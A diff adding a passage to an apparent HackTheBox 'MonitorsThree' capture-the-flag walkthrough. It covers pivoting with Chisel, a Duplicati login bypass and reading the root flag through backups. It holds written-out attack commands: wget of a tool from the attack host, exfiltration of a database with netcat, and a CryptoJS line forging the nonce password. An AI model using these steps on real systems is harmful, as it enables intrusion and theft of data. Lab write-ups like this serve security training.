@@ -158,6 +158,97 @@ To obtain a more stable shell we can transfer Marcus's SSH private key to our at
 ![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/key-trans-3.png){: .center}
 ![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/ssh-auth.png){: .center}
 
+We can download Chisel on the target and scan those ports to identify running services.
+We need to start a Python server in the directory containing Chisel.
+```bash
+┌──(pentester㉿kali)-[/opt]
+└─$ ls -l
+<SNIP>
+-rw-r--r-- 1 root root 8654848 Aug 20  2023 chisel
+
+┌──(pentester㉿kali)-[/opt]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Then we can use wget on the target to download Chisel from our attack host and run it in server mode.
+```bash
+marcus@monitorsthree.htb:/tmp$ wget 10.10.14.16/chisel; chmod 755 chisel
+<SNIP>            
+2024-09-26 17:30:41 (2.26 MB/s) - ‘chisel’ saved [8654848/8654848]
+<SNIP>
+
+marcus@monitorsthree.htb:/tmp$./chisel  server -p 4444 --socks5&
+[1] 1417
+```
+
+Next, we need to connect to the Chisel server running on the target using the Chisel client.
+```bash
+┌──(pentester㉿kali)-[~/MonitorsThree/Misc Files]
+└─$chisel client -v 10.10.11.30:4444 socks
+2024/09/13 23:18:27 client: Connecting to ws://10.10.11.30:4444
+2024/09/13 23:18:27 client: tun: proxy#127.0.0.1:1080=>socks: Listening
+2024/09/13 23:18:27 client: tun: Bound proxies
+2024/09/13 23:18:27 client: Handshaking...
+2024/09/13 23:18:27 client: Sending config
+2024/09/13 23:18:27 client: Connected (Latency 1.745593ms)
+2024/09/13 23:18:27 client: tun: SSH connected
+```
+
+The last step is to add the SOCKS5 port of the proxy we created in the Proxychains configuration file and use it to scan local ports on the target.
+![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/internal-service-scan.png){: .center}
+![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/internal-service-scan-1.png){: .center}
+
+We can see here that Duplicati is running locally on port 8200 of our target. This is vulnerable to an authentication bypass vulnerability. This [post](https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee) post explains in detail how to exploit this vulnerability.
+First, we need to locate the Duplicati database and transfer it to our attack host.
+![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/duplicati-db-location.png){: .center}
+![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/duplicati-db-received.png){: .center}
+
+```bash
+marcus@monitorsthree.htb: /opt/duplicati/config$ nc -q 0  10.10.14.16  9000 < Duplicati-server.sqlite 
+```
+![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/duplicati-db-received.png){: .center}
+
+Now that we have the database on our attack host, we can use SQLitebrowser to read the Duplicati server passphrase.
+![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/duplicati-server-passphrasse.png){: .center}
+
+I found it more comfortable to use SSH local port forwarding to reach to Duplicati server from my browser so I used it.
+![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/local-port-forwarding.png){: .center}
+
+Following the blog post, we need to initiate a login process while capturing each request in the process. 
+- Let's start by entering a random password in the password field.
+![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/random-password.png){: .center}
+
+- Next, In the intercepted requests we can see the Nonce that will be used to create a valid password
+![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/nonce-capture.png){: .center}
+
+- We now need to decode the server passphrase we saw in the SQLite database from Base64 and use the Hex output to generate a new password in our browser.
+![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/cybercheff.png){: .center}
+
+- To generate a valid password we need the Nonce we captured above and the base64 decoded output of the server's passphrase.
+`var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(<Nonce>) + <Base64 decoded passphrase>)).toString(CryptoJS.enc.Base64);`
+![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/nonce-password.png){: .center}
+
+- Last, we can copy the nonce password and replace it with the value of the password we see in the HTTP request during the login process to completely log in.
+![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/pass-modification.png){: .center}
+![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/duplicati-login.png){: .center}
+
+Duplicati is a backup solution for many companies. This instance runs in a docker container but after enumeration, I noticed that the host file system is mounted to the `/source` directory of the docker container. Since this application runs as root, we can start a backup process that will backup the root's files. For this machine, we will back up the root flag. We can create a backup process as shown below.
+![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/add-backup.png){: .center}
+![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/backup-des.png){: .center}
+![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/backup-root-flag.png){: .center}
+![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/home-to-start-backup.png){: .center}
+
+After we backup those files we can see them in the `tmp` directory as we mentioned above.
+![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/created-backups.png){: .center}
+
+Now that we have backed up the root flag, we can use Duplicati to restore that file in the same `tmp` directory.
+![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/restore-1.png){: .center}
+![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/restore-2.png){: .center}
+
+After restoring the backups, we can read the root file.
+![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/root-flag.png){: .center}
+
 We can start our enumeration by enumerating ports listening locally on the target.
 ![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/internal-ports.png){: .center}
 
